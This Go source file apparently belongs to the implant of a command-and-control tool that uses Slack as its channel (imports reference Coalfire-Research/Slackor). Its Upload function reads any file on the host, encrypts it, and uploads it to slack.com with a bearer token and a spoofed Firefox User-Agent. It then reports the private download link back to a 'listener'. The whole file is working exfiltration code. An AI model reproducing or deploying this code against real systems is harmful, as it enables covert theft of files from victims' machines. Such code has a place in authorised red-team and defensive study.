package slack

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"path/filepath"

	"github.com/Coalfire-Research/Slackor/internal/config"
	"github.com/Coalfire-Research/Slackor/internal/crypto"
)

// Upload sends a file to Slack, notifying the listener that a file is ready
// to download
func Upload(clientID, jobID, location string) error { //Sends a response back to the responses channel
	path := filepath.Clean(location)
	filename := filepath.Base(path)
	file, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filename)
	if err != nil {
		return err
	}
	encyptedFile, err := crypto.EncryptFile(file) //Encrypts the file before uploading to Slack
	if err != nil {
		return err
	}
	eFile := bytes.NewReader(encyptedFile)
	io.Copy(part, eFile)
	writer.Close()
	resp, err := http.NewRequest("POST", "https://slack.com/api/files.upload", body)
	if err != nil {
		return err
	}
	resp.Header.Add("Content-Type", writer.FormDataContentType())
	resp.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
	resp.Header.Add("Authorization", "Bearer "+config.Token)
	client := &http.Client{}
	r, netError := client.Do(resp)
	if netError != nil {
		fmt.Println("Connection error: " + netError.Error())
	}
	bodyText, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return err
	}
	s := string(bodyText)
	type Auto struct {
		Ok   bool `json:"ok"`
		File struct {
			ID                 string `json:"id"`
			Created            int    `json:"created"`
			Timestamp          int    `json:"timestamp"`
			Name               string `json:"name"`
			Title              string `json:"title"`
			Mimetype           string `json:"mimetype"`
			Filetype           string `json:"filetype"`
			PrettyType         string `json:"pretty_type"`
			User               string `json:"user"`
			Editable           bool   `json:"editable"`
			Size               int    `json:"size"`
			Mode               string `json:"mode"`
			IsExternal         bool   `json:"is_external"`
			ExternalType       string `json:"external_type"`
			IsPublic           bool   `json:"is_public"`
			PublicURLShared    bool   `json:"public_url_shared"`
			DisplayAsBot       bool   `json:"display_as_bot"`
			Username           string `json:"username"`
			URLPrivate         string `json:"url_private"`
			URLPrivateDownload string `json:"url_private_download"`
			Permalink          string `json:"permalink"`
			PermalinkPublic    string `json:"permalink_public"`
			EditLink           string `json:"edit_link"`
			Preview            string `json:"preview"`
			PreviewHighlight   string `json:"preview_highlight"`
			Lines              int    `json:"lines"`
			LinesMore          int    `json:"lines_more"`
			PreviewIsTruncated bool   `json:"preview_is_truncated"`
			CommentsCount      int    `json:"comments_count"`
			IsStarred          bool   `json:"is_starred"`
			Shares             struct {
			} `json:"shares"`
			Channels []interface{} `json:"channels"`
			Groups   []interface{} `json:"groups"`
			Ims      []interface{} `json:"ims"`
		} `json:"file"`
	}
	var m Auto
	json.Unmarshal([]byte(s), &m)

	SendResult(clientID, jobID, "download", base64.StdEncoding.EncodeToString([]byte(m.File.URLPrivateDownload)))
	return nil
}
